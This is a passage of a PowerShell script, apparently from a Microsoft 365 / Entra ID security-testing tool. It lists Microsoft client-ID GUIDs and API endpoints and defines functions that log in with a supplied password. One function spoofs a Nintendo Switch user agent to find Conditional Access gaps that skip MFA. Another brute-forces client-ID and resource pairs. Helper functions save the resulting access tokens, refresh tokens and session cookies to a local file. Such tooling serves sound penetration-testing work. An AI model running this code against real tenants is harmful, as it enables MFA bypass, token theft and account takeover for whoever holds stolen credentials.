    "ba9ff945-a723-4ab5-a977-bd8c9044fe61" = "My Staff"
    "bad22d78-f2ba-40cb-9218-665a00dcab72" = "Managed Labs Ibiza PROD"
    "bb2a2e3a-c5e7-4f0a-88e0-8e01fd3fc1f4" = "CPIM Service"
    "bb301b1f-c8f3-473a-9ff5-7ad970c639c2" = "Azure Analysis Services User Picker"
    "bb5ffd56-39eb-458c-a53a-775ba21277da" = "Security Copilot Portal"
    "bb8f18b0-9c38-48c9-a847-e1ef3af0602d" = "Microsoft.Azure.ActiveDirectoryIUX"
    "bc59ab01-8403-45c6-8796-ac3ef710b3e3" = "Outlook Online Add-in App"
    "bda0771f-b6df-474a-b348-26a308db88aa" = "Microsoft_Azure_Security_Insights"
    "be1918be-3fe3-4be9-b32b-b542fc27f02e" = "M365 Compliance Drive Client"
    "bed12bc0-3a62-470d-998c-e47546e7b039" = "NucleusDesktop"
    "bf04bdab-e06f-44f3-9821-d3af64fc93a9" = "Dynamics 365 Fraud Protection"
    "bf61aded-9a54-4603-be22-84d20158607b" = "Microsoft Teams Platform Monetization"
    "c00e9d32-3c8d-4a7d-832b-029040e7db99" = "Microsoft Azure Information Protection"
    "c0ab8ce9-e9a0-42e7-b064-33d422df41f1" = "M365ChatClient"
    "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
    "c1c74fed-04c9-4704-80dc-9f79a2e515cb" = "Yammer Web"
    "c26d35f8-e7e9-4a67-9180-d9f50d5e981c" = "Office Online Loop integration SSO"
    "c40dfea8-483f-469b-aafe-642149115b3a" = "Microsoft_AAD_Devices"
    "c44b4083-3bb0-49c1-b47d-974e53cbdf3c" = "Azure Portal"
    "c475db56-f463-48d8-931a-cfa7cd642289" = "Feedback Portal UX"
    "c4fe64aa-7e1f-4995-bfb8-107e8ef9bbe3" = "ScanXManagement"
    "c5386751-be6d-4c64-b7f3-3a393514e87a" = "OneNote Class Notebook Add-in"
    "c556d48a-da18-409b-817d-064fa2fcf2a0" = "Microsoft_Azure_Policy"
    "c56f381d-fc23-4d17-98a9-75fdd5a3a114" = "Microsoft.Azure.ManagedIdentities.UX"
    "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
    "c5eb93c5-ea21-48c2-a137-4a7641c61bc8" = "Microsoft_Azure_WorkloadInsights"
    "c61d67cf-295a-462c-972f-33af37008751" = "Call Quality Dashboard"
    "c632b3df-fb67-4d84-bdcf-b95ad541b5c8" = "Azure VPN"
    "c7bb12bf-0b39-4f7f-9171-f418ff39b76a" = "Azure Lab Services"
    "c8423563-e8f6-49f2-924b-90d9f664378a" = "Viva Goals"
    "c84a0f23-a0f8-4e8e-918b-57db620d110a" = "Power Platform Admin Center Client Test"
    "c98e5057-edde-4666-b301-186a01b4dc58" = "MicrosoftEndpointDLP"
    "c9a559d2-7aab-4f13-a6ed-e7e9c52aec87" = "Microsoft Forms"
    "ca01d00c-bfd6-46d6-ae7d-be5b5267d037" = "ZTNA Policy Service Client"
    "cab96880-db5b-4e15-90a7-f3f1d62ffe39" = "Microsoft Defender Platform"
    "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
    "cb2ff863-7f30-4ced-ab89-a00194bcf6d9" = "Azure AI Studio App"
    "cb5b7de5-2ef8-4fb2-9600-9feadb91dc45" = "Microsoft Launcher"
    "cbf8c392-4ffb-4d85-9d4a-f7678d381a1f" = "Windows App - Android"
    "cd39c5ca-1d6a-44a4-bf0d-8fbb623a6666" = "Microsoft_Azure_Dashboard"
    "cdad765c-f191-43ba-b9f5-7aef392f811d" = "Azure SignalR Service Resource Provider"
    "cde6adac-58fd-4b78-8d6d-9beaf1b0d668" = "Global Secure Access Client"
    "ce178962-7dfd-402b-a9f6-07a84a648539" = "Cognitive Services Content Moderator"
    "ce48853e-0605-4f77-8746-d70ac63cc6bc" = "Bot Framework Composer"
    "ce9f9f18-dd0c-473e-b9b2-47812435e20d" = "Microsoft Dynamics CRM for tablets and phones"
    "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
    "cf53fce8-def6-4aeb-8d30-b158e7b1cf83" = "Microsoft Stream Portal"
    "cf6d7e68-f018-4e0a-a7b3-126e053fb88d" = "Azure AD Connect Health Agent"
    "cf710c6e-dfcc-4fa8-a093-d47294e44c66" = "Azure Analysis Services Client"
    "cf8f0657-7610-4b05-8723-a4322ae045c6" = "Microsoft Dynamics Document Routing Agent"
    "d2eb9fef-f34c-40ec-b6a3-4bf524065158" = "Office voice transcript generator AAD"
    "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
    "d32c68ad-72d2-4acb-a0c7-46bb2cf93873" = "Microsoft Activity Feed Service"
    "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
    "d3ee6f25-becc-4659-9bc6-bbe6af7d18e6" = "OneLTI"
    "d48cb907-3a0f-481e-a0d1-41097337a938" = "EAPortals-AAD-PROD-PME"
    "d5097d05-956f-4ae2-b6a2-eff25f5689b3" = "Windows Update for Business Cloud Extensions PowerShell"
    "d5527362-3bc8-4e63-b5b3-606dc14747e9" = "Dynamics Retail Cloud POS"
    "d5a56ea4-7369-46b8-a538-c370805301bf" = "Azure Artifacts"
    "d5e23a82-d7e1-4886-af25-27037a0fdc2a" = "ZTNA Network Access Client -- M365"
    "d66e9e8e-53a4-420c-866d-5bb39aaea675" = "networkcopilotRP"
    "d6b5a0bd-bf3f-4a8c-b370-619fb3d0e1cc" = "Dynamics Retail Modern POS"
    "d7304df8-741f-47d3-9bc2-df0e24e2071f" = "Azure Machine Learning Workbench Web App"
    "d7813711-9094-4ad3-a062-cac3ec74ebe8" = "Microsoft.Azure.Services.AppAuthentication"
    "d7b530a4-7680-4c23-a8bf-c52c121d2e87" = "Microsoft Edge Enterprise New Tab Page"
    "d9ce8cfa-8bd8-4ff1-b39b-5e5dd5742935" = "Omnichannel for CS CRM ClientApp Primary"
    "da7b2a48-99e4-4e2b-a492-06d19a39ca57" = "XSync Server Agent"
    "dad37da6-229d-4bc0-8b94-fee8600589db" = "Zero Trust Segmentation"
    "dae89220-69ba-4957-a77a-47b78695e883" = "Universal Print Native Client"
    "db465503-d247-463e-8a13-95889346b742" = "OLEDB Client Driver"
    "db662dc1-0cfe-4e1c-a843-19a68e65be58" = "KustoClient"
    "dc807dec-d211-4b3f-bc8a-43b3443c4874" = "Azure OpenAI Studio"
    "dcceb79b-67c2-4b15-a03e-2299d8b413bb" = "Microsoft_Azure_Linux"
    "dd34f6e5-71d9-4a89-95bb-75e237d6ae71" = "Event Hub Portal App"
    "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3" = "Microsoft Defender for Mobile"
    "dd762716-544d-4aeb-a526-687b73838a22" = "Microsoft Device Registration Client"
    "de50c81f-5f80-4771-b66b-cebd28ccdfc1" = "Device Management Client"
    "e00d2f8a-f6c8-46e4-b379-e66082e28ca8" = "Azure ExP"
    "e036f41b-7edf-47ee-b373-b4b374a2e33c" = "Modern Workplace App Diagnostic Authenticator"
    "e0497406-d33e-45d9-82be-371739e437a9" = "Microsoft_AzureStackHCI_PortalExtension"
    "e1979c22-8b73-4aed-a4da-572cc4d0b832" = "App Studio for Microsoft Teams"
    "e1ef36fd-b883-4dbf-97f0-9ece4b576fc6" = "Yammer Web Embed"
    "e28ff72c-58a5-49ba-8125-42ec264d7cd0" = "Office Browser Extension"
    "e2ef5054-0287-4db6-afa3-013d96881fd3" = "Microsoft OneDrive desktop sync client"
    "e4712ded-3c3d-47d4-b800-91eea97808aa" = "Sophia Platform Service"
    "e4d7e78b-c114-46b9-9880-29f5b1cf4a90" = "Microsoft_Azure_Kailani"
    "e526e72f-ffae-44a0-8dac-cf14b8bd40e2" = "Fidalgo Dataplane Public"
    "e68ae87f-5acd-403b-a8f5-40a0dd42f6b5" = "Dynamics 365 Business Central Mobile Client"
    "e6c2449c-aafc-4709-a7a6-6a019e4b5377" = "Bing Chat"
    "e6ce1a54-4f33-4fdc-a782-6c14e4095474" = "Microsoft_Azure_WorkloadMonitor"
    "e6d9c1d6-72d0-4722-92b2-85d61ff9a464" = "Reflex - Public"
    "e8caf904-b6ac-4b01-85f6-b0d8e15e58a6" = "Azure Data Factory Ibiza Extension"
    "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
    "e9c19b55-5325-4cf3-a268-e380bc74c907" = "Microsoft_EMM_ModernWorkplace"
    "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
    "e9cee14e-f26a-4349-886f-10048e3ef4b8" = "Yammer Android"
    "e9f49c6b-5ce5-44c8-925d-015017e9f7ad" = "Azure Data Lake"
    "ea0616ba-638b-4df5-95b9-636659ae5121" = "Power BI Gateway"
    "ea62c1c6-550b-4238-8ea7-c55a85d86be8" = "Teams Work Report"
    "ea82ed9a-5efb-4911-877e-ef6896bf3586" = "Viva Glint"
    "ea8d014c-04e7-450c-a600-eaa309e42309" = "ZTNA UX Portal"
    "eb20f3e3-3dce-4d2c-b721-ebb8d4414067" = "Managed Meeting Rooms"
    "ebde7daf-df42-4ade-81a4-d67b339b49e9" = "Windows Clock"
    "ec52d13d-2e85-410e-a89a-8c79fb6a32ac" = "Azure Synapse Studio"
    "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
    "ed5bac54-b6be-4d16-9e6d-63d177fa3bf7" = "Teams Managed Service Surface Hub Agent"
    "ee90a17f-1cb7-4909-be27-dfc2dcc4dc15" = "Power Automate Desktop"
    "eea619ad-603a-4b03-a386-860fcc7410d1" = "Microsoft Mesh"
    "ef47e344-4bff-4e28-87da-6551a21ffbe0" = "Olympus Test"
    "efcacd1b-d299-4553-8ff0-f9351d9ff044" = "ADIbizaUX-AsyncProcessor"
    "efdffe3a-aeb7-40c4-9490-e2d563152033" = "Microsoft_Azure_ServiceFabric"
    "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
    "f0b72488-7082-488a-a7e8-eada97bd842d" = "Power BI Report Builder"
    "f229df84-05da-4ca8-a893-6e514fca6157" = "Teams Walkie Talkie Service"
    "f36c30df-d241-4c14-a0ee-752c71e4d3da" = "IDS-PROD"
    "f3723d34-6ff5-4ceb-a148-d99dcd2511fc" = "Bot Framework Dev Portal"
    "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
    "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
    "f4548917-4954-4f48-8185-cd902208436c" = "Liftr-IN-FPA-PRT-AME"
    "f52f5287-0be2-4052-83e8-e69620aa67cc" = "Microsoft Intune for Education portal extension"
    "f53895d3-095d-408f-8e93-8f94b391404e" = "Portfolios"
    "f64071b9-a79b-4655-9dad-3b3535e00b84" = "Websites Extensions"
    "f702b36e-7ae0-4249-8718-e004e3275e92" = "Guardian Resource Gateway"
    "f7691d3f-18be-4a7b-8639-efbb9ff02349" = "Microsoft Reflect and Insights"
    "f9818e52-50bd-463e-8932-a1650bd3fad2" = "Kusto Web Explorer"
    "f9885e6e-6f74-46b3-b595-350157a27541" = "Microsoft_AAD_UsersAndTenants"
    "f9a5ac11-cab3-45f0-9d0f-83463ba2e34c" = "make.test.powerpages.microsoft.com"
    "fa3d58b1-f3bc-489e-954e-119d58a29bae" = "Office Scripts"
    "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based Powershell"
    "fc03f97a-9db0-4627-a216-ec98ce54e018" = "Azure AD Notification"
    "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
    "fca5a20d-55aa-4395-9c2f-c6147f3c9ffa" = "Microsoft Remote Assist"
    "fdd7719f-d61e-4592-b501-793734eb8a0e" = "SharePoint Migration Tool"
    "fe1b2b53-eb41-4515-a3b4-d62059faf520" = "Microsoft Engage Hub"
    "fe8f0c38-d9f1-42cc-ad58-0080879a4b9b" = "Microsoft Azure Automation portal extension"
    "feb2c8aa-4f70-4881-abec-521141627b04" = "make.gov.powerapps.us"
    "0a5f63c0-b750-4f38-a71c-4fc0d58b89e2" = "Intune Management Setup"
    "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9" = "Device Registration"
    "1f5530b3-261a-47a9-b357-ded261e17918" = "Multi-Factor Auth Connector"
    "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
    "981f26a1-7f43-403b-a875-f8b09b8cd720" = "Multi-Factor Auth Client"
    "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
    "b642c013-22f8-419d-af11-8f0e05b795e6" = "Intune Management Setup"
    "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
    "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
    "00000002-0000-0ff1-ce00-000000000000" = "Office 365 Exchange Online"
}
$ApiEndpoints = @{
    "Microsoft Graph" = "https://graph.microsoft.com/"
    "Azure AD Graph (Legacy)" = "https://graph.windows.net/"
    "Exchange Online" = "https://outlook.office365.com/"
    "SharePoint Online" = "https://*.sharepoint.com/"
    "Microsoft Teams" = "https://api.spaces.skype.com"
    "Azure Resource Manager" = "https://management.azure.com/"
    "Azure Service Management (Classic)" = "https://management.core.windows.net/"
    "Azure Key Vault" = "https://vault.azure.net"
    "Azure Storage" = "https://storage.azure.com/"
    "Azure SQL Database" = "https://database.windows.net/"
    "Azure Cosmos DB" = "https://cosmos.azure.com"
    "Azure Data Lake" = "https://datalake.azure.net/"
    "Azure Data Explorer (Kusto)" = "https://*.kusto.windows.net"
    "Azure Service Bus" = "https://servicebus.windows.net/"
    "Azure Event Hubs" = "https://eventhubs.azure.net"
    "Azure Batch" = "https://batch.core.windows.net/"
    "Azure Analysis Services" = "https://*.asazure.windows.net"
    "Azure Monitor" = "https://data.monitor.azure.com"
    "Azure Log Analytics" = "https://api.loganalytics.io"
    "Azure Application Insights" = "https://api.applicationinsights.io"
    "Azure API Management" = "https://*.azure-apim.net"
    "Azure Cognitive Services" = "https://cognitiveservices.azure.com"
    "Azure IoT Hub" = "https://iothubs.azure.net"
    "Azure Healthcare APIs (FHIR)" = "https://azurehealthcareapis.com"
    "Azure HDInsight" = "https://*.clusteraccess.azurehdinsight.net"
    "Azure Managed Grafana" = "https://*.azgrafana.io"
    "Azure App Service" = "https://appservice.azure.com"
    "Azure Virtual Desktop (WVD)" = "https://www.wvd.microsoft.com"
    "Azure DevOps" = "https://app.vssps.visualstudio.com/"
    "Power BI" = "https://analysis.windows.net/powerbi/api"
    "Microsoft Fabric" = "https://api.fabric.microsoft.com"
    "Power Apps" = "https://service.powerapps.com/"
    "Dynamics 365 CRM" = "https://*.crm.dynamics.com/"
    "Dynamics 365 Business Central" = "https://api.businesscentral.dynamics.com"
    "Dynamics 365 Lifecycle Services" = "https://lcs.dynamics.com"
    "Microsoft Intune" = "https://manage.microsoft.com"
    "Microsoft Defender for Endpoint" = "https://api.securitycenter.microsoft.com"
    "Microsoft 365 Defender" = "https://api.security.microsoft.com"
    "Microsoft Purview Compliance Center" = "https://protection.office.com/"
    "Microsoft Purview API" = "https://api.purview.microsoft.com"
    "Microsoft Information Protection (AIP/AADRM)" = "https://aadrm.com"
    "Office 365 Management APIs" = "https://manage.office.com"
    "Azure Privileged Identity Management (PIM)" = "https://*.mspim.ext.azure.com/"
    "Azure Identity Governance (Access Reviews)" = "https://api.accessreviews.identitygovernance.azure.com/"
    "Microsoft eDiscovery" = "https://aedrouting.ediscovery.office.com"
    "OneNote" = "https://*.onenote.com/"
    "Yammer / Viva Engage" = "https://api.yammer.com"
    "Skype for Business Online" = "https://*.online.lync.com/"
    "Microsoft Stream" = "https://stream.microsoft.com"
    "Office 365 Compliance PowerShell" = "https://ps.compliance.protection.outlook.com"
    "Mobile App Management Service" = "https://msmamservice.api.application"
    "Windows Information Protection - US" = "https://wip.mam.manage.microsoft.us/"
    "Windows Information Protection" = "https://wip.mam.manage.microsoft.com/"
    "Windows Information Protection - PPE" = "https://wip.mam.manage-ppe.microsoft.us/"
}
$GuidNamesShort = @{
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
    "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
    "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
    "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
    "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
    "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
    "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
    "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
    "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
    "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
    "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
    "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
    "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsoft Intune Company Portal"
    "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
    "b642c013-22f8-419d-af11-8f0e05b795e6" = "Intune Management Setup"
    "00000002-0000-0ff1-ce00-000000000000" = "Office 365 Exchange Online"
    "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
    "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
    "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
    "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
    "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
    "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
    "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
    "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
    "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
    "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
    "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge (Chromium)"
    "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge (Legacy)"
    "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio (Legacy)"
    "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
    "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
    "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
    "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
    "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9" = "Device Registration"
    "1f5530b3-261a-47a9-b357-ded261e17918" = "Multi-Factor Auth Connector"
    "981f26a1-7f43-403b-a875-f8b09b8cd720" = "Multi-Factor Auth Client"
    "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
    "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
    "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
    "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
    "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
    "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Microsoft 365 Copilot"
    "cab96880-db5b-4e15-90a7-f3f1d62ffe39" = "Microsoft Defender Platform"
    "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3" = "Microsoft Defender for Mobile"
    "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
    "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
    "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
    "0e90d0b8-039a-4936-a6f4-d25dd510be5d" = "Message Recall"
}

$ApiEndpointsShort = @{
    "Microsoft Graph" = "https://graph.microsoft.com/"
    "Azure AD Graph (Legacy)" = "https://graph.windows.net/"
    "Exchange Online" = "https://outlook.office365.com/"
    "SharePoint Online" = "https://*.sharepoint.com/"
    "Microsoft Teams" = "https://api.spaces.skype.com"
    "Azure Resource Manager" = "https://management.azure.com/"
    "Azure Service Management (Classic)" = "https://management.core.windows.net/"
    "Azure Key Vault" = "https://vault.azure.net"
    "Azure Storage" = "https://storage.azure.com/"
    "Azure SQL Database" = "https://database.windows.net/"
}




Function Invoke-UnknownPlatformAuth{

    Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [switch]$WriteTokens,

    [Parameter(Position = 3, Mandatory = $False)]
    [switch]$DebugWebAuth,

    [Parameter(Position = 4, Mandatory = $False)]
    [string]$DebugUserAgent = "NintendoSwitch"
    )

    Write-Host "---------------- Unknown Platform MFA Bypass Check ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing for misconfigured Conditional Access policies that don't enforce MFA for unknown device platforms..."
    Write-Host -ForegroundColor Yellow "[*] Using a Nintendo Switch user agent so Entra ID reports the device platform and browser as Unknown."

    if ($WriteTokens){
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype NintendoSwitch -WriteTokens -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
    }
    else{
        Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype NintendoSwitch -DebugWebAuth:$DebugWebAuth -DebugUserAgent $DebugUserAgent
    }
}

Function Invoke-BruteClientIDs {
    Param(
        [string]$Username,
        [string]$Password,
        [array]$ClientIDs = $null,
        [string]$ClientIDFilePath = $null,
        [string]$ApiEndpointsFilePath = $null,
        [switch]$VerboseOut,
        [switch]$FullResourceList,
        [switch]$FullClientIdList
    )

    $GuidNamesList = if ($FullClientIdList) { $GuidNames } else { $GuidNamesShort }
    $ApiEndpointsMap = if ($FullResourceList) { $ApiEndpoints } else { $ApiEndpointsShort }

    $itemCountA = $GuidNamesList.Count
    $itemCountB = $ApiEndpointsMap.Count
    Write-Host "[*] Now testing $itemCountA client IDs across $itemCountB resources."

     if ($ClientIDFilePath -or $ApiEndpointsFilePath) {
        $data = Load-ClientIDsAndAPIEndpoints -ClientIDFilePath $ClientIDFilePath -ApiEndpointsFilePath $ApiEndpointsFilePath
        
        # Override default ClientIDs and API Endpoints if files are passed
        if ($ClientIDFilePath) {
            $ClientIDs = $data.ClientIDs
        } else {
            $ClientIDs = $GuidNamesList
        }

        if ($ApiEndpointsFilePath) {
            $ApiEndpointsList = $data.ApiEndpoints
        } else {
            $ApiEndpointsList = $ApiEndpointsMap.Values
        }
    } else {
        # If no file paths, use hardcoded values
        $ClientIDs = $GuidNamesList.Keys
        $ApiEndpointsList = $ApiEndpointsMap.Values
    }
    if ($ClientIDFilePath -or $ApiEndpointsFilePath) {
        foreach ($ClientID in $ClientIDs) {
            Write-Host "[*] Now testing ClientID $ClientID"
            foreach ($Endpoint in $ApiEndpointsList) {
                #Write-Host "Resource = $Endpoint"
                if($VerboseOut){
                    Invoke-GraphAPIAuth -Username $Username -Password $Password -ClientID $ClientID -BruteClients -Resource $Endpoint -WriteTokens -VerboseOut
                }
                else{
                    Invoke-GraphAPIAuth -Username $Username -Password $Password -ClientID $ClientID -BruteClients -Resource $Endpoint -WriteTokens
                }
            }
        }
    }
    else{
        foreach ($ClientID in $ClientIDs) {
            $AppName = $GuidNamesList[$ClientID]
            Write-Host "[*] Now testing ClientID $ClientID - $AppName"
            foreach ($Endpoint in $ApiEndpointsList) {
                #Write-Host "Resource = $Endpoint"
                if($VerboseOut){
                    Invoke-GraphAPIAuth -Username $Username -Password $Password -ClientID $ClientID -BruteClients -Resource $Endpoint -WriteTokens -VerboseOut
                }
                else{
                    Invoke-GraphAPIAuth -Username $Username -Password $Password -ClientID $ClientID -BruteClients -Resource $Endpoint -WriteTokens
                }
            }
        }
    }
}

Function Get-JsonFileEntries {
    param (
        [string]$Path
    )

    if (!(Test-Path $Path)) {
        return @()
    }

    $rawContent = Get-Content -Path $Path -Raw -ErrorAction SilentlyContinue
    if ([string]::IsNullOrWhiteSpace($rawContent)) {
        return @()
    }

    try {
        $parsedContent = $rawContent | ConvertFrom-Json -ErrorAction Stop
        return @($parsedContent)
    }
    catch {
        $legacyEntries = @()
        $jsonBlocks = [regex]::Split($rawContent.Trim(), "\r?\n\s*\r?\n")
        foreach ($jsonBlock in $jsonBlocks) {
            if ([string]::IsNullOrWhiteSpace($jsonBlock)) {
                continue
            }

            try {
                $legacyEntries += ($jsonBlock | ConvertFrom-Json -ErrorAction Stop)
            }
            catch {
                Write-Host -ForegroundColor Yellow "[*] WARNING: Unable to parse an existing entry in $Path. It was skipped."
            }
        }

        return @($legacyEntries)
    }
}

Function Add-JsonEntryToFile {
    param (
        [string]$Path,
        $Entry
    )

    $entries = @(Get-JsonFileEntries -Path $Path)
    $entries += $Entry
    $entries | ConvertTo-Json -Depth 100 | Set-Content -Path $Path -Encoding UTF8
}

Function Write-TokensToFile {
    param (
        [switch]$WriteTokens,
        [string]$Resource,
        [string]$ClientId,
        [string]$AccessToken,
        [string]$RefreshToken
    )

    if ($WriteTokens) {
        $basePath = if ($PSScriptRoot) { $PSScriptRoot } else { "." }
        $tokenFilePath = Join-Path -Path $basePath -ChildPath "AccessTokens.json"
        $currentDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

        # Create the new token entry
        $tokenData = @{
            "Timestamp"    = $currentDate
            "Resource"     = $Resource
            "ClientId"     = $ClientId
            "AccessToken"  = $AccessToken
            "RefreshToken" = $RefreshToken
        }

        Add-JsonEntryToFile -Path $tokenFilePath -Entry $tokenData

        Write-Host -ForegroundColor Cyan "[*] Token appended to $tokenFilePath"
    }
}


Function Write-CookiesToFile {
    param (
        [System.Net.CookieCollection]$Cookies,
        [string]$UserAgent
    )

    $basePath = if ($PSScriptRoot) { $PSScriptRoot } else { "." }
    $tokenFilePath = Join-Path -Path $basePath -ChildPath "AccessTokens.json"
    $currentDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    # Prepare cookie data
    $cookieData = @{
        "Timestamp"  = $currentDate
        "UserAgent"  = $UserAgent
        "Cookies"    = @()
    }

    foreach ($cookie in $Cookies) {
        $cookieData["Cookies"] += @{
            "Name"  = $cookie.Name
            "Value" = $cookie.Value
        }
    }

    Add-JsonEntryToFile -Path $tokenFilePath -Entry $cookieData

    Write-Host -ForegroundColor Cyan "[*] Cookies and User Agent appended to $tokenFilePath"
}

Function Load-ClientIDsAndAPIEndpoints {
    Param(
        [string]$ClientIDFilePath,
        [string]$ApiEndpointsFilePath
    )
    
    # Load Client IDs from file
    if (Test-Path $ClientIDFilePath) {
        $ClientIDs = Get-Content -Path $ClientIDFilePath
    } else {
        Write-Host "Client ID file not found at path: $ClientIDFilePath" -ForegroundColor Red
        return
    }
    
    # Load API Endpoints from file
    if (Test-Path $ApiEndpointsFilePath) {
        $ApiEndpoints = Get-Content -Path $ApiEndpointsFilePath
    } else {
        Write-Host "API Endpoints file not found at path: $ApiEndpointsFilePath" -ForegroundColor Red
        return
    }
    
    return @{ClientIDs = $ClientIDs; ApiEndpoints = $ApiEndpoints}
}

